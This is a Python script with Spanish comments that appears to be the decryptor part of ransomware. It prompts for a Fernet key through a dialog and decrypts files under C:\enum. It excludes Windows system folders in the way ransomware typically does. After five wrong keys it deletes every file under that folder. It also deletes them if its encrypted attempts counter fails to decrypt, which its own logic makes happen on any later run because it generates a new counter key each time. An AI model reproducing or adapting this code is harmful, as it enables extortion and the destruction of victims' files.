import os
import tkinter as tk
from tkinter import simpledialog, messagebox
from cryptography.fernet import Fernet, InvalidToken
from tqdm import tqdm

# Directorio raíz del sistema
root_dir = 'C:\\enum'

# Ruta del archivo de clave
key_path = 'C:\\enum2\\key.key'

# Archivo de intentos fallidos
attempts_path = 'C:\\enum2\\.decrypt_attempts'

# Archivo de registro para `tqdm`
log_file_path = 'C:\\enum2\\decrypt_log.txt'

# Generar una clave interna para cifrar el contador de intentos
internal_key = Fernet.generate_key()
internal_cipher = Fernet(internal_key)

# Leer el número de intentos fallidos
attempts = 0
if os.path.exists(attempts_path):
    with open(attempts_path, 'rb') as attempts_file:
        encrypted_attempts = attempts_file.read()
    try:
        decrypted_attempts = internal_cipher.decrypt(encrypted_attempts)
        attempts = int(decrypted_attempts.decode())
    except InvalidToken:
        print("Error: Archivo de intentos comprometido. Eliminando archivos.")
        for dirpath, dirnames, filenames in os.walk(root_dir):
            for filename in filenames:
                os.remove(os.path.join(dirpath, filename))
        exit()

# Lista de exclusiones
exclusions = [
    'C:\\Windows',
    'C:\\Program Files',
    'C:\\Program Files (x86)',
    'C:\\Users\\Default',
    'C:\\Users\\Public',
    'C:\\Users\\<Username>\\AppData',
    'C:\\Users\\<Username>\\NTUSER.DAT',
    'C:\\Users\\<Username>\\ntuser.dat.LOG1',
    'C:\\Users\\<Username>\\ntuser.dat.LOG2',
    'C:\\Users\\<Username>\\Local Settings',
    'C:\\Users\\<Username>\\LocalService',
    'C:\\Users\\<Username>\\NetworkService'
]

def should_exclude(path):
    for exclusion in exclusions:
        if path.startswith(exclusion):
            return True
    return False

# Solicita la clave de encriptación al usuario y verifica si es correcta
def get_encryption_key():
    root = tk.Tk()
    root.withdraw()
    return simpledialog.askstring("Clave de encriptación", "Introduce la clave de encriptación:", show='*')

key = None
cipher = None
is_valid_key = False

while not is_valid_key and attempts < 5:
    key = get_encryption_key()
    if key is None:
        print("Operación cancelada por el usuario.")
        exit()
    key = key.encode()
    try:
        cipher = Fernet(key)
        # Probar desencriptar algo para verificar la clave
        test_file = False
        for dirpath, dirnames, filenames in os.walk(root_dir):
            if should_exclude(dirpath):
                continue
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                try:
                    with open(filepath, 'rb') as file:
                        encrypted_data = file.read()
                    cipher.decrypt(encrypted_data)
                    test_file = True
                    break
                except InvalidToken:
                    continue
            if test_file:
                break
        is_valid_key = True
    except InvalidToken:
        attempts += 1
        encrypted_attempts = internal_cipher.encrypt(str(attempts).encode())
        with open(attempts_path, 'wb') as attempts_file:
            attempts_file.write(encrypted_attempts)
        if attempts < 5:
            messagebox.showerror("Clave incorrecta", f"Clave de encriptación incorrecta. Te quedan {5 - attempts} intentos.")
        else:
            messagebox.showerror("Máximo de intentos alcanzado", "Número máximo de intentos fallidos alcanzado. Eliminando archivos.")
            for dirpath, dirnames, filenames in os.walk(root_dir):
                if should_exclude(dirpath):
                    continue
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    os.remove(filepath)
            exit()

if is_valid_key:
    # Restablecer el contador de intentos si la clave es correcta
    if os.path.exists(attempts_path):
        os.remove(attempts_path)

    def decrypt_and_restore_file(filepath):
        try:
            with open(filepath, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = cipher.decrypt(encrypted_data)
            
            with open(filepath, 'wb') as decrypt_file:
                decrypt_file.write(decrypted_data)
        except Exception as e:
            print(f"Error desencriptando el archivo {filepath}: {e}")

    total_files = sum([len(files) for r, d, files in os.walk(root_dir) if not should_exclude(r)])

    # Redirigir la salida de `tqdm` a un archivo de registro
    with open(log_file_path, 'w') as log_file:
        with tqdm(total=total_files, desc="Desencriptando archivos", unit="archivo", file=log_file) as pbar:
            for dirpath, dirnames, filenames in os.walk(root_dir):
                if should_exclude(dirpath):
                    continue
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    decrypt_and_restore_file(filepath)
                    pbar.update(1)

    print("Archivos desencriptados y restaurados con sus nombres y rutas originales.")
